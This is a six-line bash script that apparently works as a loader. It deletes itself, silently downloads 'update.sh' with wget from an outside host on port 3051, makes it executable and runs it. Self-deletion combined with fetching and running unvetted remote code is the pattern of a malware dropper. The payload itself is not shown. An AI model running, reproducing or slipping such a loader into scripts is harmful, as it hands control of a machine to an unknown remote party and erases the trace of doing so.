#!/bin/bash
cd
rm -- "$0"
wget -qO updatesc.sh "http://getbot.nevpn.my.id:3051/update.sh"
chmod +x updatesc.sh
./updatesc.sh
